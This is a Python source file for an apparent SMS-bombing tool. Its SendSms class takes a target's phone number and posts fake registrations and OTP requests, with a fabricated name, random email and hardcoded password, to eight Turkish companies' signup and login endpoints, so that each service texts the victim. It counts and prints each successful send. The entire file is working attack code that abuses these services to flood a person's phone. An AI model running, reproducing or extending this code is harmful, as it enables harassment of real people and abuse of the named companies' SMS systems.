import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from json import dumps

class SendSms():
    random_mail = ''.join(choice(ascii_lowercase) for i in range(20))
    adet = 0
    
    def __init__(self, phone):
        self.phone = phone

    # market.sleepy.com.tr--sms
    def sleepy(self):    
        try:
            sleepy = requests.post("https://market.sleepy.com.tr/Customer/SendCode/", data={
                "phoneNumber": f"0{self.phone}",
                "firstName": "AHMET", 
                "lastName": "YILDIRIM",
                "email": f"{self.random_mail}@gmail.com",
                "type": "customer",
                "registerType": "1",
                "campaingPermission": "true"
            })
            if sleepy.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: sleepy.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: sleepy.com.tr")

    # babyturco.com--sms
    def babyTurco(self):    
        try:
            baby_turco = requests.post("https://market.babyturco.com.tr/Customer/SendCode/", data={
                "phoneNumber": f"0{self.phone}",
                "firstName": "AHMET",
                "lastName": "YILDIRIM",
                "email": f"{self.random_mail}@gmail.com",
                "type": "customer",
                "campaingPermission": "true"
            })
            if baby_turco.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: babyturco.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: babyturco.com.tr")
        

    # otokocikinciel.com--sms
    def otoKocikinciel(self):    
        try:    
            otokocikinciel = requests.post("https://www.otokocikinciel.com/Ajax/SendOtp", data={
                "GsmNos": self.phone,
                "PermissionType": "1"
            })
            if otokocikinciel.json()["Result"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: otokocikinciel.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: otokocikinciel.com")
        

    #gediktrader.com--sms
    def gedikTrader(self):
        try:
            gediktrader = requests.post("https://web.gediktrader.com/v/controllers/gedikRegistrationPhase1", data={
                "username": "AHMET",
                "surname": "YILDIRIM",
                "email": f"{self.random_mail}@gmail.com",
                "password": "31ABC..abc31",
                "phone": f"+90{self.phone}",
                "city": "aydin",
                "address": "asdas d",
                "from": "registerform"
            })
            if gediktrader.json() == "SUCCESS":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: gediktrader.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: gediktrader.com")
    
    #bim--sms
    def bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: bim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: bim.com")
            
    
    #tiklagelsin.com--sms
    def tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: tiklagelsin.com")
            
    #englishhome.com--sms
    def englishhome(self):
        try:
            data = {"first_name": "AHMET", "last_name": "YILDIRIM", "email": f"{self.random_mail}@gmail.com", "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
            home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
            if home.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: englishhome.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: englishhome.com")

    #auth.kentkart.com--sms
    def kentkart(self):
        try:
            data = {
                "clientId": "rH7S2", 
                "countryCode": "tr", 
                "loginType": "phone", 
                "phoneNumber": self.phone, 
                "responseType": "code"
                }
            kentkart = requests.post("https://auth.kentkart.com/rl1/oauth/otp?region=003&authType=4&version=Web_1.4.3_1.0_CHROME_kentkart.web.mkentkart&lang=tr", data=data)
            if kentkart.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Giden Hedef: auth.kentkart.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Giden Hedef: auth.kentkart.com")